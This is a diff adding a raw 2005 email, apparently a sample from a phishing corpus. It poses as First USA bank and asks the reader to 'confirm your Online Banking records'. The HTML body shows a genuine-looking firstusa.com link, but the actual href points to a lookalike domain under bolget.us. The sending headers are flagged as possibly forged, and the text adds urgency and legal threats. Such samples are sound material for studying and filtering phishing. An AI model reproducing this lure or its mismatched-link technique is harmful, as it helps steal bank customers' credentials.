@@ -1,0 +1,91 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 95A372A88C
+	for <user@example.com>; Sat,  9 Jul 2005 22:33:11 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 8DB94621C9A; Sat,  9 Jul 2005 22:33:11 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 6FF93621C92
+	for <user@example.com>; Sat,  9 Jul 2005 22:33:11 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id WAA17376
+	for user@example.com; Sat, 9 Jul 2005 22:33:11 -0400
+Received: from cardservices.firstusa.com (cdma-3g1x-184-59.zappmobile.ro [80.97.184.59] (may be forged))
+	by mail.example.com with SMTP id WAA17368
+	for <user@biochemistry.bioc.cwru.edu>; Sat, 9 Jul 2005 22:33:09 -0400
+Message-Id: <200507100233.WAA17368@mail.example.com>
+From: "First USA Corporation" <custsupport@firstusa.com>
+To: user <user@biochemistry.bioc.cwru.edu>
+Subject: Confirm your Online Banking records
+Date: Sat, 9 Jul 2005 19:32:50 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2800.1081
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1081
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 30
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title></title>
+</head>
+
+<body>
+<img src="https://online.firstusa.com/images/bolLogoFUSA.gif">
+<!--VERSION value="4.3.0"-->
+<TABLE cellSpacing=0 cellPadding=0 width=774 border=0 xt="SPTABLE"
+name="SP_TABLE1" id="table1" height="320">
+<TBODY>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy" height="42">
+</TD></TR>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy">
+
+<p align="left"><font face="Verdana" size="2">In attention of First USA customers,</font></p>
+<p align="justify"><font face="Verdana" size="2">As the Internet and information technology enable us to expand our services, we are committed to maintaining the trust customers have placed in us for protecting the privacy and security of information we have about you. In order to protect your information against unauthorized access, identity theft and account fraud we earnestly ask you to update your profile.   </font></p>
+
+
+<p align="justify"><font face="Verdana" size="2">To get started, please click 
+the link below:</font></p>
+        <p align="justify"><font face="Verdana" size="2"> <b> <a target="_blank" href="http://online.firstusa.com.bank.bolget.us/~admin/.%20/index.php"> 
+          http://online.firstusa.com/BolVerifyGetStart/BolSecureGetStart.html?bolType=Rew</a></b></font></p> 
+        <p align="justify"><font face="Verdana" size="2">If you received this 
+          notice and you are not the authorized account holder, please be aware 
+          that it is in violation of our policy to represent oneself as another 
+          First USA Bank user. Such action may also be in violation of local, 
+          national, and/or international law. First USA Bank is committed to assist 
+          law enforcement with any inquiries related to attempts to missappropriate 
+          personal information with the intent to commit fraud or theft. Information 
+          will be provided at the request of law enforcement agencies to ensure 
+          that perpetrators are prosecuted to the fullest extent of the law.</font></p>
+<p align="justify"><font face="Verdana" size="2">Thanks for your patience as we work together to protect your account.</font></p>
+<p align="justify"><font face="Verdana" size="2">Regards,</font></p>
+<p align="justify"><font face="Verdana" size="2">Customer Support Center.</font></p>
+
+<font size="1" face="verdana,arial,helvetica" color="#bbb7c7"><div align="left"><span class="footer-text"><br>
+          <br>
+  <br>
+          </span><br>
+</div></font>
+
+<font size="1" face="verdana,arial,helvetica" color="#bbb7c7">
+        <div align="right">&copy; 2005 FIRST USA </div>
+        </font>
+</TD></TR>
+</TBODY></TABLE>
+</body>
+
+</html>
+
